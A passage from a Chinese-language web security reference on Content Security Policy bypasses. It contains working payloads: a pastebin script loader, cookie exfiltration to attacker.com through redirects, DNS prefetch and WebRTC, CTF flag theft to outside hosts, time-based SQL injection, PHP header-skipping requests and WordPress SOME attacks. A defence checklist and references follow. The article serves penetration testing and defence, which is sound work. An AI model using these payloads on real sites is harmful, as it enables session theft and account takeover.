  '<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>';
```

通过 `innerHTML` 创建 `javascript:` URL 的 iframe 绕过 CSP——Chrome 中此漏洞已被修复。

#### 5.10 CSP + Iframe 信息泄露

**重定向泄露**：

- 创建指向 CSP 允许 URL 的 iframe（如 `https://example.redirect.com`）
- 该 URL 重定向到**不被 CSP 允许**的秘密 URL（如 `https://usersecret.example2.com`）
- 监听 `securitypolicyviolation` 事件，`blockedURI` 属性包含被阻止域——泄露秘密子域名

**二进制搜索子域**：通过迭代修改 CSP 规则（允许/阻止特定子域），根据哪些请求被阻止缩小秘密子域的字符范围。

#### 5.11 Bookmarklets 攻击

需要社会工程学：攻击者说服用户将恶意链接拖放到浏览器书签栏。Bookmarklet 的 JavaScript 在**当前页面上下文中**执行，**完全绕过 CSP**，可窃取 Cookie、Token 等敏感信息。

---

### 6. 服务端技术绕过

#### 6.1 PHP 参数过多导致 header() 失效

发送超量 GET/POST 参数（>1000 个 GET 参数或多于 20 个文件上传），PHP 触发启动警告（E_WARNING），**任何后续的 `header()` 调用均失败**——CSP 头不会发出。

#### 6.2 PHP Response Buffer 溢出

PHP 默认缓冲 4096 字节。若 PHP 在 CSP `header()` 之前输出警告（warning），且警告数据量超过 4096 字节，响应在 CSP 头之前发送，**CSP 头被完全忽略**。

关键：用足够多的 warnings 填满输出缓冲区。

#### 6.3 max_input_vars 跳过 CSP

PHP 先处理输入变量启动阶段再调用 `header()`。若输入变量数超过 `max_input_vars`：

```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```

```bash
# 正常情况 → 浏览器拦截
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# 超出 max_input_vars → PHP 在 header() 之前发出警告 → CSP 头未发送
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```

**headers already sent** 意味着 CSP 完全失效，反射型 XSS 可自由执行。

#### 6.4 Rewrite Error Page

加载可能无 CSP 的错误页面并重写其内容以执行脚本：

```javascript
a = window.open("/" + "x".repeat(4100));
setTimeout(function() {
  a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

通过超长 URL 触发无 CSP 的错误页面，然后重写其 DOM 注入恶意脚本。

---

### 7. SOME + WordPress

SOME (Same Origin Method Execution) 利用同一域内某个端点的**受限 JS 执行**（如 JSONP callback）来**操作同一域内其他端点的 DOM**。

**WordPress 特有攻击面**：

WordPress 存在 JSONP 端点 `/wp-json/wp/v2/users/1?_jsonp=data`，在 `'self'` CSP 白名单下可被加载。

攻击流程：
1. 攻击者创建恶意页面
2. 窗口 A 导航到 WordPress 管理页面（有趣 DOM，如安装插件页面）
3. 窗口 B（由窗口 A 创建，通过 `window.open`）加载 `/wp-json/wp/v2/users/1?_jsonp=some_attack`
4. 窗口 B 的 JSONP callback 通过 `opener` 对象操作窗口 A 的 DOM——点击按钮、提权用户、安装恶意插件等

```html
<script src="/wp-json/wp/v2/users/1?_jsonp=some_attack"></script>
```

该 `<script>` 标签被 `'self'` 允许加载，callback 执行后可利用 `opener` 操纵同源的敏感操作页面。

---

### 8. CSP 数据外带技术

当 CSP 严格限制对外请求时的兜底外带手段：

#### 8.1 Location 重定向

```javascript
var sessionid = document.cookie.split("=")[1] + ".";
document.location = "https://attacker.com/?" + sessionid;
```

#### 8.2 Meta Refresh

```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
仅重定向，不泄露内容（但可结合 timing 攻击）。

#### 8.3 DNS Prefetch

利用浏览器的 DNS 预解析机制将数据编码为子域名：

```javascript
var sessionid = document.cookie.split("=")[1] + ".";
var body = document.getElementsByTagName("body")[0];
body.innerHTML = body.innerHTML +
  '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.ch">';
```

或：

```javascript
const linkEl = document.createElement("link");
linkEl.rel = "prefetch";
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

**限制**：无头浏览器（Headless Bots）中可能不触发 DNS Prefetch。服务端可通过 `X-DNS-Prefetch-Control: off` 防御。

#### 8.4 WebRTC

WebRTC **不检查 `connect-src` CSP 指令**，可通过 DNS 请求泄露数据：

```javascript
(async () => {
  p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] });
  p.createDataChannel("");
  p.setLocalDescription(await p.createOffer());
})();
```

TURN 凭据泄露变体：

```javascript
var pc = new RTCPeerConnection({
  "iceServers": [{
    "urls":["turn:74.125.140.127:19305?transport=udp"],
    "username":"_all_your_data_belongs_to_us",
    "credential":"."
  }]
});
pc.createOffer().then((sdp) => pc.setLocalDescription(sdp));
```

#### 8.5 CredentialsContainer

`CredentialsContainer` API 在弹出凭据选择器时发送 DNS 请求获取 iconURL，不受 CSP 限制（需安全上下文 HTTPS 或 localhost）：

```javascript
navigator.credentials.store(
  new FederatedCredential({
    id: "satoki",
    name: "satoki",
    provider: "https:" + your_data + "example.com",
    iconURL: "https:" + your_data + "example.com"
  })
);
```

---

### 9. `'unsafe-inline'` + `img-src *` 组合攻击

```
default-src 'self' 'unsafe-inline'; img-src *;
```

`'unsafe-inline'` 允许执行任何脚本，`img-src *` 允许加载任意图片。利用图片外带数据：

```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23')
  .then(_ => _.text())
  .then(_ => new Image().src = 'http://PLAYER_SERVER/?' + _)
</script>
```

### img-src *; via XSS (iframe) — 时间侧信道

即使缺少 `'unsafe-inline'`，通过 XSS 在 iframe 中加载攻击者控制的页面，使用 SQLi 时间盲注逐字符提取信息：

```javascript
<iframe name="f" id="g"></iframe>
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
  x = escape(x.replace(/_/g, "\\_"));
  return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}
async function query(word, end=false) {
  let h = performance.now();
  f.location = end ? gen2(word) : gen(word);
  await new Promise((r) => { g.onload = r; });
  let diff = performance.now() - h;
  return diff > 300;
}
// 逐字符猜解 flag
</script>
```

每次正确字符导致数据库 sleep(0.1) 增加响应时间，通过 `performance.now()` 测量差异逐字符提取。

### JS 隐藏在图片中

若 `img-src *` 允许加载 Twitter 等平台的图片，可将 JS 代码编码进 PNG 图片，上传至白名单平台，然后在页面中通过 `'unsafe-inline'` XSS 加载图片、提取 JS 并执行。

---

## 攻击链与联动

### 链 1：Angel + CDN 允许域 → 完整 XSS

```
[CSP 白名单 cdnjs.cloudflare.com] → 加载 Angular + Prototype.js →
  gadget chain 获取 window 对象 → 执行任意 JS
```

### 链 2：File Upload + 'self' → RCE

```
[找到文件上传点] → 上传 .wave 或 .png.js polyglot → 
  CSP script-src 'self' 信任同源 → <script> 加载执行
```

### 链 3：Iframe Error Page → 脚本执行

```
[CSP 严格 script-src] → 诱导服务器错误 (超长 URL / cookie overflow) →
  iframe 加载无 CSP 错误页 → 注入 <script> 标签执行
```

### 链 4：Service Worker → 持久化接管

```
[XSS 注入] → 注册恶意 Service Worker ({scope: '/'}) →
  持久监听所有页面 fetch 事件 → 所有 URL 泄露到攻击者服务器
```

### 链 5：SOME + WordPress → 管理员权限

```
[CSP: script-src 'self'] → 加载 /wp-json/wp/v2/users/1?_jsonp=attack →
  callback 通过 opener 操纵 WordPress 管理面板 → 安装恶意插件/提权
```

### 链 6：Policy Injection → Defense Nullification

```
[CRLF 注入 / 参数污染] → 修改 CSP 响应头 → 
  添加 'unsafe-inline' 或 script-src-elem * → CSP 完全失效
```

---

## 检测与防御

### CSP 配置安全检查清单

| 检查项 | 不安全配置 | 安全配置 |
|--------|-----------|----------|
| `script-src` | 包含 `'unsafe-inline'` 或 `'unsafe-eval'` | `'nonce-{random}'` + `'strict-dynamic'` |
| `object-src` | 缺失（`default-src` 不覆盖） | 始终设置 `object-src 'none'` |
| `base-uri` | 缺失 | 始终设置 `base-uri 'self'` 或 `'none'` |
| `form-action` | 缺失（`default-src` 不覆盖） | 始终设置 `form-action 'self'` |
| `frame-ancestors` | 缺失 | 始终设置（防止 Clickjacking） |
| 信任域 | CDN / Google APIs / Facebook 等 | 审查所有白名单域是否存在 JSONP/重定向/用户托管能力 |
| Nonce | 可预测或复用 | 每次请求随机生成，至少 128 位熵 |

### 关键防御原则

1. **CSP nonce + strict-dynamic + Trusted Types**：当前最有效的 XSS 防御组合
2. **消除所有注入点**：CSP 是纵深防御措施，不是唯一防线——根除 XSS/HTML 注入是根本
3. **审查第三方白名单**：使用 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 检查每个白名单域的可滥用性
4. **始终显式声明所有指令**：不依赖 `default-src` 的默认回退——它对 `form-action`、`frame-ancestors`、`base-uri` 等指令不生效
5. **服务端确保 CSP 头始终发出**：PHP 中避免在 `header()` 之前产生任何输出或警告
6. **`X-DNS-Prefetch-Control: off`**：阻止 DNS Prefetch 外带数据
7. **Service Worker Kill-Switch**：预留紧急禁用 SW 的机制

### 在线检测工具

- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) — 检测 CSP 策略中的不安全配置
- [CSP Validator](https://cspvalidator.org/) — 在线验证 CSP 策略有效性
- [csper.io CSP Generator](https://csper.io/docs/generating-content-security-policy) — 自动生成 CSP
- [Dresscode (SensePost)](https://github.com/sensepost/dresscode) — 大规模 CSP 扫描与健康状态分析工具

### 用户侧检测信号

- CSP 违规报告（`report-uri`）中出现意外的被阻止请求
- Service Worker 被意外注册（检查 `chrome://serviceworker-internals`）
- 异常 DNS Prefetch 请求（即使页面上无对应 `<link>` 标签）
- 地址栏显示正确但页面行为异常（链接不可点击、表单提交到意外地址）

---

## 实战要点

### 测试方法

1. **识别 CSP 策略**：检查响应头 `Content-Security-Policy` 和 `<meta>` 标签
2. **运行 CSP Evaluator**：自动检测白名单域的可滥用性
3. **检查缺失指令**：`object-src`、`base-uri`、`form-action`、`frame-ancestors` 是否缺失
4. **搜索 JSONP 端点**：在白名单域上扫描 JSONP callback 接口（使用 [JSONBee](https://github.com/zigoo0/JSONBee)）
5. **验证 iframe 绕过**：在 iframe 中加载同源路径，检查是否可执行脚本并访问 `top.document`
6. **测试策略注入**：若 CSP 值包含用户输入，尝试注入 `script-src-elem *;` 或 `;_`
7. **测试 PHP 错误绕过**：发送超量参数检测 CSP 头是否因 headers-already-sent 而失效

### 最小化 PoC — iframe CSP 绕过验证

```python
# Flask 测试服务器 — 验证 script-src 'none' 下 iframe 脚本执行
import flask
from flask import Flask

app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'none'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

### 限制与注意事项

- **`strict-dynamic` + nonce** 仍然是目前最安全的 CSP 配置——但需确保无 DOM XSS 可复用 nonce
- **浏览器差异**：Edge 的 CSP 解析器曾存在严重缺陷（`;_` 全策略丢弃），测试时覆盖多浏览器
- **CSP 报告可能泄露信息**：`report-uri` 端点接收的违规报告中可能包含敏感数据（URL 参数、页面 DOM 片段）
- **Service Worker 24 小时持久性**：修复 XSS 后恶意 SW 可能继续活跃——需部署 SW Kill-Switch
- **第三方白名单域的风险是动态的**：今天安全的 CDN 明天可能新增用户可托管功能

---

## 参考资料

### 原始研究
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [PortSwigger Research: Bypassing CSP with Policy Injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
- [PortSwigger Research: Using Form Hijacking to Bypass CSP (2024)](https://portswigger.net/research/using-form-hijacking-to-bypass-csp)
- [PortSwigger Research: Bypassing CSP with Dangling Iframes (2022)](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)
- [PortSwigger Research: Stealing Passwords from Infosec Mastodon Without Bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
- [SensePost: Dress Code — The Talk about CSP Third-Party Abuses (2023)](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses)
- [Huli's Blog: AngularJS CSP Bypass via CDN Libraries](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)
- [Joaxcar: CSP Bypass on PortSwigger.net Using Google Script Resources (2024)](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/)
- [Orange Tsai: The Art of PHP — CTF-born Exploits and Techniques (2025)](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [Wallarm: How to Trick CSP in Letting You Run Whatever You Want](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [Secjuice: Hiding JavaScript in PNG — CSP Bypass](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)
- [Slonser: Make Self-XSS Great Again (Credentialless Iframes + fetchLater)](https://blog.slonser.info/posts/make-self-xss-great-again/)
- [PortSwigger Research: Hijacking Service Workers via DOM Clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
- [SOCRadar: CSP Bypass Unveiled — The Hidden Threat of Bookmarklets](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)
- [Chromium: CVE-2020-6519 CSP Bypass Vulnerability Disclosure](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
- [Octagon: Bypass CSP Using WordPress by Abusing SOME](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)
- [Human Security: Exfiltrating Users' Private Data Using Google Analytics to Bypass CSP](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)

### 工具
- [JSONBee (GitHub)](https://github.com/zigoo0/JSONBee) — JSONP CSP 绕过端点集合
- [Shadow Workers (GitHub)](https://shadow-workers.github.io) — Service Worker 利用 C2
- [SOME Attack Generator](https://www.someattack.com/Playground/SOMEGenerator) — SOME 攻击 PoC 生成器

---

## 交叉引用

- [XSS (Cross-Site Scripting)](../../Reflected%20Values/XSS/) — CSP 防御的首要目标，CSP 绕过的前置条件
- [Clickjacking](../Clickjacking/) — 同为浏览器客户端安全机制绕过
- [Iframe Traps / Click Isolation](../Iframe%20Traps/) — iframe 持久化劫持，与 CSP iframe 绕过互补
- [Dangling Markup](../../Reflected%20Values/Dangling%20Markup/) — 无脚本数据窃取，配合 missing base-uri
- [CSRF](../../Forms-WebSockets-PostMsgs/Cross%20Site%20Request%20Forgery/) — form-action 缺失时的联动攻击
- [PostMessage Vulnerabilities](../../Forms-WebSockets-PostMsgs/PostMessage%20Vulnerabilities/) — SOP 绕过，与 credentialless iframe 配合
- [DOM Clobbering](../../Reflected%20Values/XSS/) — 劫持 SW importScripts 参数
- [SOME (Same Origin Method Execution)](../../Reflected%20Values/XSS/) — 受限 JS + 同源 DOM 操作
